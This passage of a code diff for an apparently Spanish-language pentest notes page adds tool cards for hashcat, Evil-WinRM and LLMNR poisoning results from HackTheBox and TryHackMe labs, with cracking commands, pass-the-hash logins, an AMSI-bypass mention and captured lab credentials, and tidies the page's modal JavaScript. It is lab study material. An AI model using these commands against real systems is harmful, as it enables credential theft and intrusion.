+      { heading: 'Hashes vs. texto claro', content: `<ul><li>SMB/HTTP → NTLMv2 hash (necesita crackear con hashcat -m 5600)</li><li>MSSQL linked server con SQL auth → credenciales en <strong>texto claro</strong></li><li>El texto claro ocurre porque SQL Server no cifra la autenticación del linked server si no está configurado Force Encryption</li></ul>` }
+    ],
+    tags: ['LLMNR Poisoning', 'NTLMv2', 'Cleartext Credentials', 'MitM', 'MSSQL', 'T1557', 'T1040'],
+    ref: 'Usado en: Overwatch HTB (Fase 6) — captura de sqlmgmt:bIhBbzMMnB82yx en texto claro'
+  },
+
+  hashcat: {
+    label: 'CREDENTIAL ACCESS · Hash Cracking',
+    title: 'hashcat',
+    sections: [
+      { heading: 'Qué es', content: `<p>hashcat es el cracker de contraseñas más rápido del mundo, con soporte para GPU (CUDA/OpenCL/Metal). Soporta más de 300 tipos de hash y múltiples modos de ataque. Con una GPU moderna puede probar miles de millones de candidatos por segundo para hashes rápidos como NTLM.</p>` },
+      { heading: 'Uso en el lab · AS-REP hash (Spookysec)', content: `<pre><span class="cmd-comment"># Modo 18200 = Kerberos 5 AS-REP etype 23 (RC4)</span>\n<span class="cmd-tool">hashcat</span> <span class="cmd-flag">-m</span> <span class="cmd-value">18200</span> hashes.txt /usr/share/wordlists/rockyou.txt\n\n$krb5asrep$23$svc-admin@...: <span class="cmd-value">management2005</span>\nStatus: <span class="cmd-value">Cracked</span></pre>` },
+      { heading: 'Modos de hash relevantes para AD', content: `<ul><li><strong>1000</strong> — NTLM (hash local de Windows)</li><li><strong>5600</strong> — NetNTLMv2 (capturado con Responder)</li><li><strong>13100</strong> — Kerberoasting (TGS-REP etype 23)</li><li><strong>18200</strong> — AS-REP Roasting (etype 23 / RC4)</li><li><strong>19700</strong> — AS-REP Roasting (etype 18 / AES256 — muy lento)</li></ul>` },
+      { heading: 'Modos de ataque', content: `<ul><li><strong>-a 0</strong> — Diccionario (wordlist)</li><li><strong>-a 3</strong> — Fuerza bruta con máscara (?u?l?l?l?d?d)</li><li><strong>-a 6</strong> — Wordlist + máscara (password + año)</li><li><strong>-r rules/best64.rule</strong> — Reglas de mutación sobre wordlist</li></ul>` }
+    ],
+    tags: ['Hash Cracking', 'GPU', 'AS-REP', 'NTLM', 'NetNTLMv2', 'Kerberoasting', 'T1110.002'],
+    ref: 'Usado en: Spookysec THM (Fase 4) — cracking de hash AS-REP de svc-admin → management2005'
+  },
+
+  evilwinrm: {
+    label: 'POST-EXPLOITATION · WinRM',
+    title: 'Evil-WinRM',
+    sections: [
+      { heading: 'Qué es', content: `<p>Evil-WinRM es una shell interactiva sobre Windows Remote Management (WinRM, puertos 5985 HTTP / 5986 HTTPS). Añade funcionalidades de post-explotación sobre el protocolo estándar: Pass-the-Hash, carga de scripts, bypass de AMSI y logging evasion.</p>` },
+      { heading: 'Autenticación con contraseña y PtH', content: `<pre><span class="cmd-comment"># Con contraseña</span>\n<span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> TARGET <span class="cmd-flag">-u</span> sqlmgmt <span class="cmd-flag">-p</span> <span class="cmd-value">bIhBbzMMnB82yx</span>\n\n<span class="cmd-comment"># Pass-the-Hash (solo hash NTLM, sin contraseña)</span>\n<span class="cmd-tool">evil-winrm</span> <span class="cmd-flag">-i</span> TARGET <span class="cmd-flag">-u</span> Administrator \\\n           <span class="cmd-flag">-H</span> <span class="cmd-value">0e0363213e37b94221497260b0bcb4fc</span>\n\n*Evil-WinRM* PS> whoami\nspookysec\\administrator</pre>` },
+      { heading: 'Funcionalidades post-explotación', content: `<ul><li><strong>upload / download</strong> — transferencia de ficheros bidireccional</li><li><strong>Bypass AMSI</strong> — <code>Bypass-4MSI</code> en la shell</li><li><strong>-s /path/to/scripts/</strong> — carga scripts PS1 locales en memoria remota</li><li><strong>menu</strong> — lista comandos especiales disponibles</li></ul>` },
+      { heading: 'Enumeración inicial post-acceso', content: `<pre><span class="cmd-comment"># Verificar usuario y privilegios</span>\nwhoami /all\n\n<span class="cmd-comment"># Procesos corriendo (buscar servicios interesantes)</span>\nGet-Process | Select-Object Name, Id, Path\n\n<span class="cmd-comment"># Puertos en escucha (encontrar servicios internos)</span>\nnetstat -ano | findstr LISTENING</pre>` }
+    ],
+    tags: ['WinRM', 'Pass-the-Hash', 'NTLM', 'AMSI Bypass', 'Post-Exploitation', 'Shell', 'T1550.002'],
+    ref: 'Usado en: Overwatch HTB (Fase 7 — acceso como sqlmgmt) · Spookysec THM (Fase 8 — PtH como Administrator)'
+  }
+
 };
 
 function openModal(id) {
-const t = tools[id]; if (!t) return;
-let sectionsHTML = t.sections.map(s => `<h3>${s.heading}</h3>${s.content}`).join(’’);
-let tagsHTML = t.tags.map(tag => `<span class="tag">${tag}</span>`).join(’’);
-document.getElementById(‘modal-content’).innerHTML = ` <div class="modal-header"> <div class="modal-meta"> <span class="modal-label">${t.label}</span> <span class="modal-title">${t.title}</span> </div> <button class="modal-close" onclick="closeModal()">✕</button> </div> <div class="modal-body"> ${sectionsHTML} <div class="writeup-ref"><strong>📎 Referencia writeup</strong><br>${t.ref}</div> <div class="modal-tags">${tagsHTML}</div> </div>`;
-document.getElementById(‘modal-overlay’).classList.add(‘open’);
-document.body.style.overflow = ‘hidden’;
+  const t = tools[id];
+  if (!t) return;
+  const sectionsHTML = t.sections.map(s => `<h3>${s.heading}</h3>${s.content}`).join('');
+  const tagsHTML = t.tags.map(tag => `<span class="tag">${tag}</span>`).join('');
+  document.getElementById('modal-content').innerHTML = `
+    <div class="modal-header">
+      <div class="modal-meta">
+        <span class="modal-label">${t.label}</span>
+        <span class="modal-title">${t.title}</span>
+      </div>
+      <button class="modal-close" onclick="document.getElementById('modal-overlay').classList.remove('open');document.body.style.overflow='';">✕</button>
+    </div>
+    <div class="modal-body">
+      ${sectionsHTML}
+      <div class="writeup-ref"><strong>📎 Referencia writeup</strong><br>${t.ref}</div>
+      <div class="modal-tags">${tagsHTML}</div>
+    </div>`;
+  document.getElementById('modal-overlay').classList.add('open');
+  document.body.style.overflow = 'hidden';
 }
 
 function closeModal(e) {
-if (e && e.target !== document.getElementById(‘modal-overlay’)) return;
-document.getElementById(‘modal-overlay’).classList.remove(‘open’);
-document.body.style.overflow = ‘’;
+  if (e && e.target !== document.getElementById('modal-overlay')) return;
+  document.getElementById('modal-overlay').classList.remove('open');
+  document.body.style.overflow = '';
 }
-document.addEventListener(‘keydown’, e => { if (e.key === ‘Escape’) closeModal(); });
+document.addEventListener('keydown', e => { if (e.key === 'Escape') closeModal(); });
 </script>
 
 </body>
